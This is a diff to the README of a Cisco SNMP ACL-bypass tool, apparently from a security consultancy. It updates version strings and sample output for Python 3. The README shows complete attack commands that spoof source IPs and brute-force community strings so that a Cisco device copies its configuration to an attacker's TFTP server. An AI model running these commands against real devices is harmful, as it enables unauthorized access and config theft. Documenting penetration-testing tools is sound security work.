@@ -3,6 +3,8 @@ OVERVIEW
 cisco-snmp-slap utilises IP address spoofing in order to bypass an ACL
 protecting an SNMP service on a Cisco IOS device.
 
+Requires Python 3.8+ and scapy (`pip install -r requirements.txt`).
+
 Typically IP spoofing has limited use during real attacks outside DoS. Any TCP
 service cannot complete the inital handshake. UDP packets are easier to spoof
 but the return packet is often sent to the wrong address, which makes it 
@@ -70,16 +72,14 @@ save some time by assuming a whole subnet will be allowed access rather
 than just one IP address.
 
     root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask cisco 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
-    Cisco SNMP Slap,  v0.3
+    Cisco SNMP Slap, v1.0.0
     Darren McDonald, darren.mcdonald@nccgroup.com
-    
-    WARNING: No route found for IPv6 destination :: (no default route?)
-    Community String:   cisco
-    TFTP Server IP  :   10.0.0.2
-    Source IP:          10.0.0.5
-    Source Mask:        0.255.255.0
-    Destination IP:     10.0.0.1
-    TFTP Root Path:     /tftproot//cisco-config.txt
+    Community String:  cisco
+    TFTP Server IP  :  10.0.0.2
+    Source IP:         10.0.0.5
+    Source Mask:       0.255.255.0
+    Destination IP:    10.0.0.1
+    TFTP Root Path:    /tftproot//cisco-config.txt
     10.0.0.5
     10.0.1.5
     10.0.2.5
@@ -108,17 +108,15 @@ For example to repeat the same attack using a list of community strings in in
 list.txt the following arguments should be used.
 
     root@Athena:/home/notroot/cisco-snmp-slap# ./slap.py seqmask_l list.txt 10.0.0.2 10.0.0.5 0.255.255.0 10.0.0.1 /tftproot/
-    Cisco SNMP Slap,  v0.3
+    Cisco SNMP Slap, v1.0.0
     Darren McDonald, darren.mcdonald@nccgroup.com
-    
-    WARNING: No route found for IPv6 destination :: (no default route?)
-    Community File: list.txt
-    TFTP Server IP  :   10.0.0.2
-    Source IP:  10.0.0.5
-    Source Mask:0.255.255.0
-    Destination IP: 10.0.0.1
-    TFTP Root Path: /tftproot//cisco-config.txt
-    community strings loaded:  ['private\n', 'cisco\n', 'public\n']
+    Community File:    list.txt
+    TFTP Server IP  :  10.0.0.2
+    Source IP:         10.0.0.5
+    Source Mask:       0.255.255.0
+    Destination IP:    10.0.0.1
+    TFTP Root Path:    /tftproot//cisco-config.txt
+    Community strings loaded: ['private', 'cisco', 'public']
     10.0.0.5 /  private
     10.0.0.5 /  cisco
     10.0.0.5 /  public
@@ -153,3 +151,4 @@ VERSIONS
 * 0.2 Added random and sequental modes and source address masks
 * 0.3 added community string file list feature, first public version
 * 0.3.1 now uses os.sep so that paths work correctly on Windows
+* 1.0.0 Modernized to Python 3, added argparse, explicit imports, PEP 8 style
